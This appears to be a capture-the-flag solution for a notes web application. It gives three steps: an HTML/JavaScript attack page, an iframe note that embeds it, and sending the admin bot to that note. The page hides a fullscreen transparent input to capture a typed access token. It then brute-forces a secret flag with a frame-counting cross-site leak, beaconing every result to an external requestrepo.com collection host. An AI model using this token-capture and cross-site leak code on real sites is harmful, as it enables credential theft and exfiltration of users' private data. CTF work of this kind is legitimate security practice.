1. Upload file to webhook

```html
<!DOCTYPE html>
<html>
<head>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        input {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            font-size: 48px;
            background: transparent;
            border: none;
            outline: none;
            color: transparent;
            caret-color: transparent;
        }
    </style>
</head>
<body>
<input id="token">
<script>
const EXFIL = 'https://w95fsrwf.requestrepo.com/';
const FLAGID = "7b2567d6-2b8c-42ea-963e-50ec6a07eea0";
const TARGET = 'http://127.0.0.1:3333';
const CHARSET = 'abcdefghijklmnopqrstuvwxyz0123456789_}';

let flag = 'ssm{';

const input = document.getElementById('token');
let token = '';
let leaking = false;

navigator.sendBeacon(`${EXFIL}?payload=loaded&flagId=${FLAGID}`);

parent.location = TARGET+"/notes#"+FLAGID
navigator.sendBeacon(`${EXFIL}?payload=hash_swapped`);

input.addEventListener('input', () => {
    token = input.value;
    if (token.length === 64 && !leaking) {
        leaking = true;
        navigator.sendBeacon(`${EXFIL}?token_complete=${token}`);
        leakFlag();
    }
});

async function leakFlag() {

    navigator.sendBeacon(`${EXFIL}?leak_started&prefix=${flag}`);
    while (!flag.endsWith('}')) {
        let found = false;
        
        for (const c of CHARSET) {
            const guess = flag + c;
            const url = `${TARGET}/search?q=${encodeURIComponent(guess)}&access=${encodeURIComponent(token)}`;
            
            const frameCount = await countFrames(url);
            navigator.sendBeacon(`${EXFIL}?guess=${encodeURIComponent(guess)}&frames=${frameCount}`);
            
            if (frameCount > 0) {
                flag = guess;
                found = true;
                navigator.sendBeacon(`${EXFIL}?found=${encodeURIComponent(flag)}`);
                break;
            }
        }
        
        if (!found) {
            navigator.sendBeacon(`${EXFIL}?stuck=${encodeURIComponent(flag)}`);
            break;
        }
    }
}

function countFrames(url) {
    return new Promise((resolve) => {
        const win = window.open(url, 'leak');
        
        setTimeout(() => {
            const count = win.length;
            window.open("about:blank", 'leak');
            resolve(count);
        }, 50);
    });
}

function sleep(ms) {
    return new Promise(r => setTimeout(r, ms));
}
</script>
</body>
</html>
```

2. Create note with content

```html
<iframe src=//w95fsrwf.requestrepo.com style="position:absolute;top:0;left:0;height:100vh;width:100vw;">
```

3. Send admin to url of note.
